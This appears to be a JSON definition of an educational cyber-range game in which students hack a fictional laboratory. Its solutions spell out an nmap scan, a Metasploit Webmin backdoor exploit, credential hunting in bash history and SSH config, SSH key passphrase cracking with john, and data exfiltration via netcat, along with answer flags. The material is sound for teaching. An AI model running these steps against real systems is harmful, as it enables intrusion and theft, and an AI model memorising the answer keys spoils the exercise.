{
  "title" : "Secret Laboratory",
  "description" : "This cybersecurity game allows a hands-on demonstration and practice of topics such as network scanning, SSH connections, and password cracking. It is suitable for undergraduate students in computing.",
  "prerequisites" : [ "\"prerequisites\" : [ \"Basic knowledge of Unix environment\", \"Basic networking knowledge\", \"Ability to find useful information on the internet\" ]" ],
  "outcomes" : [ "Usage of nmap", "Usage of metasploit", "Usage of john", "Transfering files using ssh, configuring ssh", "Finding hidden data in command history" ],
  "state" : "UNRELEASED",
  "show_stepper_bar" : true,
  "levels" : [ {
    "title" : "Introduction",
    "level_type" : "INFO_LEVEL",
    "order" : 0,
    "estimated_duration" : 0,
    "minimal_possible_solve_time" : null,
    "content" : "# Secret laboratory \n  \nIt's the year 2042; the country of Sauronia rules the world. The deadly ABCD-20 virus, which was artificially developed in a secret Sauronian laboratory, wiped out roughly 70% of the world population, including the leaders of all the other world superpowers. After the pandemic, nothing was stopping Sauronia from conquering every single nation that dared to stand in its way.\n\nA group of genius scientists from all around the world created a multinational rebel alliance and secretly developed a time machine. You, as their best hacker, willing to sacrifice your life for a brighter future, agreed to use the time machine to travel back in time to the year 2020. Your mission: hack into the secret laboratory and steal the information about the cure. Send it to contemporary scientists so that they may use the cure to prevent the pandemic.\n\n## Disclaimer\n\nThis game is for educational purposes only. Unauthorized use of the tools that are incorporated into the game is illegal.\n\nThe story is fictitious, and any resemblance to actual entities and events is purely coincidental.\n\n## License\n\nThis work is licensed under CC BY 4.0. Terms of this license are available at: https://creativecommons.org/licenses/by/4.0"
  }, {
    "title" : "Get Access",
    "level_type" : "ACCESS_LEVEL",
    "order" : 1,
    "estimated_duration" : 0,
    "minimal_possible_solve_time" : null,
    "passkey" : "start",
    "cloud_content" : "Your first task is to access the sandbox, where you will complete all following tasks. After you have successfully connected, Submit the answer **`start`**.\n\n### Sandbox access\n1. In the topology overview on the right, right-click on **`attacker`** and then click on **`Open GUI`**, and a new pop-up window will appear. \n2. Login with username **`user`** and password **`Password123`**.\n\nAlternatively, you can use SSH to connect to the machine. SSH access makes it easier to copy-paste commands and flags, but requires more steps to set up. See [documentation](https://docs.crp.kypo.muni.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access) for more details.",
    "local_content" : "This sandbox has not been tested for use with local sandbox."
  }, {
    "title" : "Level 1: Looking for the vulnerable service",
    "level_type" : "TRAINING_LEVEL",
    "order" : 2,
    "estimated_duration" : 10,
    "minimal_possible_solve_time" : null,
    "answer" : "Webmin",
    "answer_variable_name" : null,
    "content" : "In the year 2042, the location of the secret laboratory where the virus was developed is already known. Luckily for you, modern time machine technology could teleport you inside. One of the few things you were allowed to take with you was a USB drive with Kali Linux.\n\nYou put it to good use right upon your arrival: you incapacitated one of the employees in the lab, seized his notebook, and installed everything necessary. Now, scan the server to find possible vulnerabilities. The IP address of the server is **10.1.26.9**.\n\nAfter you run the scan, check the column VERSION of the output. The column VERSION will be in the format `protocol version_number (Service1 service2)`. As a flag, submit the content of \"Service1\", which is one word with the first letter uppercase.",
    "solution" : "```\nroot@attacker:~# nmap -sV -p 10000 10.1.26.9\n```\n\nThe flag is: ${ANSWER}\n",
    "solution_penalized" : true,
    "hints" : [ {
      "title" : "Which port should you scan?",
      "content" : "The vulnerable service is running on port 10000. You can also pass this information to `nmap` (search the documentation for what the option `-p` does).",
      "hint_penalty" : 0,
      "order" : 1
    }, {
      "title" : "Which tool should you use?",
      "content" : "Use **nmap** to scan the server. Display its manual pages or help for the command.",
      "hint_penalty" : 0,
      "order" : 0
    }, {
      "title" : "Which option gives you the version?",
      "content" : "To determine the name and version of the service, you need to pass the option **-sV** (service/version detection) to `nmap`.",
      "hint_penalty" : 0,
      "order" : 2
    } ],
    "incorrect_answer_limit" : 100,
    "attachments" : [ ],
    "max_score" : 1,
    "variant_answers" : false,
    "reference_solution" : [ ],
    "mitre_techniques" : [ ],
    "expected_commands" : [ ],
    "commands_required" : false
  }, {
    "title" : "Level 2: Exploiting the vulnerable service",
    "level_type" : "TRAINING_LEVEL",
    "order" : 3,
    "estimated_duration" : 25,
    "minimal_possible_solve_time" : null,
    "answer" : null,
    "answer_variable_name" : "level_2_flag",
    "content" : "You correctly identified the vulnerable service running on the server. Now, exploit the vulnerable service to break through and access the server. One of the tools installed on your Attacker machine should help you in this regard.\n\nAfter you exploit the server, the remote shell might not be visible. Type `shell` and then work normally. *Keep an extra terminal window with this shell open for the rest of the game,* you will need it later.\n\nThe flag will be the first line of the file _/home/chong/READ-ME.txt_.",
    "solution" : "```\nroot@attacker:~# msfconsole\n\nmsf6 > use exploit/linux/http/webmin_backdoor\n\nmsf6 exploit(linux/http/webmin_backdoor) > set RHOSTS 10.1.26.9\n\nmsf6 exploit(linux/http/webmin_backdoor) > set LHOST 10.2.135.83\n\nmsf6 exploit(linux/http/webmin_backdoor) > set SSL true\n\nmsf6 exploit(linux/http/webmin_backdoor) > exploit\n\nshell\n\ncat /home/chong/READ-ME.txt\n```\n\nThe flag is: ${ANSWER}\n",
    "solution_penalized" : true,
    "hints" : [ {
      "title" : "What are the correct options?",
      "content" : "RHOSTS needs to be set to the IP address of the server (**set RHOSTS 10.1.26.9**).\n\nLHOST needs to be set to 10.2.135.83 *because LHOST is the machine that initiates the exploit (you)* (**set LHOST 10.2.135.83**).\n\nSSL needs to be set to true, *because webmin runs on https by default* (**set SSL true**).",
      "hint_penalty" : 0,
      "order" : 3
    }, {
      "title" : "Which tool should you use?",
      "content" : "Use Metasploit. Start with using the command **msfconsole**.",
      "hint_penalty" : 0,
      "order" : 0
    }, {
      "title" : "Which exploit should you use?",
      "content" : "Command **use exploit_name** activates the exploit. The exploit you are looking for is `exploit/linux/http/webmin_backdoor`.",
      "hint_penalty" : 0,
      "order" : 1
    }, {
      "title" : "How should the exploit options be set?",
      "content" : "To successfully exploit the vulnerability, the parameters RHOSTS, LHOSTS and SSL need to be set to correct values (**set \"parameter\" \"value\"**). Once all the parameters are set, exploit the vulnerability.",
      "hint_penalty" : 0,
      "order" : 2
    } ],
    "incorrect_answer_limit" : 100,
    "attachments" : [ ],
    "max_score" : 1,
    "variant_answers" : true,
    "reference_solution" : [ ],
    "mitre_techniques" : [ ],
    "expected_commands" : [ ],
    "commands_required" : false
  }, {
    "title" : "Level 3: Find the address of the second server",
    "level_type" : "TRAINING_LEVEL",
    "order" : 4,
    "estimated_duration" : 10,
    "minimal_possible_solve_time" : null,
    "answer" : null,
    "answer_variable_name" : "level_3_flag",
    "content" : "Back in 2034, the rebel organization learned that one of the key contributors to the virus development was the infamous X. W. Chong. You know that the laboratory's server, which contains the information about the cure, is much more secure than the server you just broke into. At the same time, you are sure that Chong had access to it.\n\nIn the year 2020, authentication using SSH keys was pretty popular. Perhaps the SSH key that he used to connect to the lab could help you, that is, if you can find it. There is no doubt that Chong accessed this server regularly; in fact, it canâ€™t be a long time ago since he last connected to it.\n\nAs a flag, submit the file name without the `.pub` extension of the SSH key that Chong uses to connect to the lab. The flag is case-sensitive.\n",
    "solution" : "```\nroot@server:# cd /home/chong\n\nroot@server:/home/chong# grep ssh .bash_history\n\nsee \"ssh lab\", now to find what lab stands for\n\nroot@server:/home/chong# cat .ssh/config\n\nsee host lab, identity file\n```\n\nThe flag is: ${ANSWER}\n",
    "solution_penalized" : true,
    "hints" : [ {
      "title" : "Where should you start looking? (less detailed)",
      "content" : "You know the server was accessed in the **past**, this information is important.",
      "hint_penalty" : 0,
      "order" : 0
    }, {
      "title" : "Where are the SSH keys stored?",
      "content" : "The SSH keys are located in **/home/chong/.ssh/**.",
      "hint_penalty" : 0,
      "order" : 4
    }, {
      "title" : "Where should you start looking? (detailed)",
      "content" : "Chong's **.bash_history** might be of interest to you.",
      "hint_penalty" : 0,
      "order" : 1
    }, {
      "title" : "Which tool can help you with the search?",
      "content" : "Use **grep** to search the history for `ssh` command.",
      "hint_penalty" : 0,
      "order" : 2
    }, {
      "title" : "Where should you look to obtain the flag?",
      "content" : "SSH can be configured in a way that you donâ€™t have to use long commands over and over again. A certain file contains all the info about the full command, including the name of the SSH key.",
      "hint_penalty" : 0,
      "order" : 3
    } ],
    "incorrect_answer_limit" : 100,
    "attachments" : [ ],
    "max_score" : 1,
    "variant_answers" : true,
    "reference_solution" : [ ],
    "mitre_techniques" : [ ],
    "expected_commands" : [ ],
    "commands_required" : false
  }, {
    "title" : "Level 4: Find the SSH key passphrase",
    "level_type" : "TRAINING_LEVEL",
    "order" : 5,
    "estimated_duration" : 20,
    "minimal_possible_solve_time" : null,
    "answer" : "mrscorona7",
    "answer_variable_name" : null,
    "content" : "You managed to find Chongâ€™s SSH key! However, it isnâ€™t usable yet. You need to copy it to your Attacker machine and crack its passphrase to connect to the lab as Chong did. Luckily, you have all the necessary tools on your Attacker machine.\n\nThe flag will be his SSH key passphrase.\n",
    "solution" : "```\nroot@server:/usr/share/webmin# cd /home/chong/.ssh\n\nroot@server:/home/chong/.ssh# cat ${level_3_flag}\n\ncopy the RSA key and switch to the attacker's terminal\n\nroot@attacker:~# nano key\n\npaste it here and save\n\nroot@attacker:~# ssh2john key > key.hash\n\nroot@attacker:~# john key.hash --wordlist=/usr/share/wordlists/fasttrack.txt\n```\n\nThe flag is: ${ANSWER}\n",
    "solution_penalized" : true,
    "hints" : [ {
      "title" : "Which tool should you use?",
      "content" : "The tool you will be using is `john`. Display its manual pages or help for the command.",
      "hint_penalty" : 0,
      "order" : 1
    }, {
      "title" : "Is the format correct?",
      "content" : "John needs to convert the private key into a different format before cracking it. For that, you need `ssh2john`.",
      "hint_penalty" : 0,
      "order" : 2
    }, {
      "title" : "How to convert the file?",
      "content" : "To convert the file, use the command **ssh2john \"key file\" > \"new file\"**, for example, `ssh2john lab_rsa > john_rsa`.",
      "hint_penalty" : 0,
      "order" : 3
    }, {
      "title" : "Which wordlist should you use?",
      "content" : "Wordlists are stored on Kali Linux in `/usr/share/wordlists`. There currently is only one file in there.",
      "hint_penalty" : 0,
      "order" : 0
    }, {
      "title" : "How to crack the password?",
      "content" : "To crack the password, use **john \"file created by ssh2john\" -wordlist=\"file with passwords\"**, for example, `john john_rsa -wordlist=/usr/share/wordlists/wordlist.txt`.",
      "hint_penalty" : 0,
      "order" : 4
    } ],
    "incorrect_answer_limit" : 100,
    "attachments" : [ ],
    "max_score" : 1,
    "variant_answers" : false,
    "reference_solution" : [ ],
    "mitre_techniques" : [ ],
    "expected_commands" : [ ],
    "commands_required" : false
  }, {
    "title" : "Level 5: Steal data and send them to scientists",
    "level_type" : "TRAINING_LEVEL",
    "order" : 6,
    "estimated_duration" : 10,
    "minimal_possible_solve_time" : null,
    "answer" : null,
    "answer_variable_name" : "level_5_flag",
    "content" : "You did it! You can now access the secret Sauronian server storing the data about the cure for the deadly virus.\n\nThe cure is located in the folder _research_ on the secret server. Send it to the rebel scientists like this:\n* Run the command `nc localhost 4444` on the Attacker.\n* *Paste the contents of the file* with the cure directly to the terminal on Attacker.\n* Wait for the scientists' response.\n\n(If your connection is refused, reconnect by running the command `researchers` in the shell on Attacker.)\n\nThe flag will be the last line of the response.",
    "solution" : "```\nroot@server:# su chong\n\nchong@server:~$ ssh lab\n\ntype yes and enter the password from level 4\n\nchong@laboratory:~$ cd research\n\nchong@laboratory:~$ ls -a\n\nchong@laboratory:~$ cat .cure.data\n\nopen new terminal...\n\nroot@attacker:# nc localhost 4444\n\npaste the contents\n```\n\nThe flag is: ${ANSWER}\n",
    "solution_penalized" : true,
    "hints" : [ {
      "title" : "What command to use to access the server?",
      "content" : "Use the same **command** Chong used in the past. (For convenience, keep two terminal windows opened.)",
      "hint_penalty" : 0,
      "order" : 1
    }, {
      "title" : "What should you do if the command doesn't work for you?",
      "content" : "Switch the user to **chong** if you want to connect to the server using his config.",
      "hint_penalty" : 0,
      "order" : 0
    }, {
      "title" : "What is the password?",
      "content" : "You know the password from the previous level.",
      "hint_penalty" : 0,
      "order" : 2
    } ],
    "incorrect_answer_limit" : 100,
    "attachments" : [ ],
    "max_score" : 1,
    "variant_answers" : true,
    "reference_solution" : [ ],
    "mitre_techniques" : [ ],
    "expected_commands" : [ ],
    "commands_required" : false
  }, {
    "title" : "Epilogue",
    "level_type" : "INFO_LEVEL",
    "order" : 7,
    "estimated_duration" : 0,
    "minimal_possible_solve_time" : null,
    "content" : "Suddenly, the sound of the alarm fills the air, and a group of soldiers breaks into the room. It doesn't bother you in the least. Since youâ€™ve already saved the world and changed the future, developing the time machine will actually never come to pass. This means you could have never been sent to the past to begin with. You already feel the universe around you shift and reorganize itself. Soon, you will leave this dank Sauronian laboratory and enter a brand new world...\n\n**Credits**:\n\nLeading authors: Stanislav BoboÅˆ, David Hofman, Jakub Smatana\n\nContributors/Consultants: Valdemar Å vÃ¡benskÃ½, Jan Vykopal"
  } ],
  "estimated_duration" : 75,
  "variant_sandboxes" : false
}
